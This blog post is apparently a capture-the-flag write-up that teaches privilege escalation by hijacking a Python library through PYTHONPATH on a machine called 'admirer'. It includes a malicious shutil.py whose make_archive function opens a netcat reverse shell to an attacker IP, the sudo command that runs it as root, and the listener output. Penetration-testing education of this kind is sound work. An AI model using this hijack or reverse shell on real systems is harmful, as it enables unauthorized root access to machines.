---
title: Python Library Hijacking
author: 4m0r
date: 2020-08-01 20:00:00 +0530
excerpt: A writeup on how I hijacked a python library for privilege escalation and owned a machine.
thumbnail: /assets/img/posts/pyLibHijack/library.jpg
categories: [Tutorial]
tags: [Python, PYTHONPATH, Library Hijacking, Privilege Escalation]
---

![Info](/assets/img/posts/pyLibHijack/library.png)

# Scenario
One time I gained *user* shell on a machine and started poking around for a privilege escalation vector. I noticed that
the user had **sudo** privilege to run a bash script. Enumerating the script, I noticed that it executes a *Python* 
script, ***backup.py***. Therefore, any (malicious) code injected into the python script gets executed with **root**
privileges.

# Limitations
Unfortunately, write access for both the bash and python script files are restricted to *root* user and *admin* group.

# Library Hijacking
Enumerating the python script offered another vital vector. The contents of the python script read as follows.
```python
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```
As seen from the code, the script imports a module called *make_archive* from the **shutil** library. An important thing
 to understand about Python is that, it imports modules by searching for them in pre-defined directories, in an order of 
priority and uses the first occurrence.

## Abusing Python Library Path with insecure permissions
The first thing I did was to find the library paths and their priority. This can be enumerated with the following command.
```shell
python -c 'import sys; print("\n".join(sys.path))'
```
The command echoed the library paths and they were compared against the actual path of *shutil.py* to identify an
injection point.
```shell 
waldo@admirer:/opt/scripts$ python -c 'import sys; print("\n".join(sys.path))'
/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages

waldo@admirer:/opt/scripts$ find /usr -type f -name shutil.py
/usr/lib/python3.5/shutil.py
/usr/lib/python2.7/shutil.py
```
Theoretically, if the user has write access to */usr/lib/python\[version]*, a duplicate library with the same name as 
the original and with malicious content can be placed there. Therefore, when the backup script is executed, this 
duplicate library and module gets presented as the first occurrence and subsequently gets executed. <br>
Unfortunately, the user I had access as, did not had write access on any of these directories. So I moved on to the 
next method.

## Abusing PYTHONPATH environment variable
PYTHONPATH[^f1] is an environment variable with which additional directories to search for Python modules can be
set. With this set, Python can be manipulated into directing the search for modules to a preferred location. To that 
effect, I then created a new directory, called **shutil** on the user's home directory. A malicious library file,
 **shutil.py**, to mimic the actual *shutil* library was placed on this new directory. The contents of the file 
 **shutil.py** is as follows.
```python
import os

def make_archive (aaa, bbb, ccc):

    os.system ("/bin/nc -e '/bin/bash' 10.10.10.9 9095")
```
Note that since we are mimicking the actual **make_archive** module, the number of arguments for this fake module should
 be the same as the original or else the function call from *backup.py* will fail with a *TypeError*. When the bash 
script is executed with sudo, the malicious **make_archive** is executed with root privileges, resulting in an elevated
 reverse shell. 

In my PenTest scenario, I gained reverse shell with PYTHONPATH as shown below.
```shell 
---TARGET---
waldo@admirer:~/shutil$ sudo PYTHONPATH=/home/waldo/shutil /opt/scripts/admin_tasks.sh
---ATTACKER---
[_4m0r@manjaro Admirer]$ nc -nvlp 9095
Connection from 10.10.10.10:50634
python -c "import pty;pty.spawn('/bin/bash');"
root@admirer:/home/waldo/shutil# id
id
uid=0(root) gid=0(root) groups=0(root)
```

# Takeaway
During privilege escalation enumeration, if you were to come across a Python script with elevated execution privileges
and uses misconfigured python libraries, it can be leveraged to a *root* shell by hijacking the library path.

# Footnotes
[^f1]:[PYTHONPATH](https://docs.python.org/3/using/cmdline.html#environment-variables)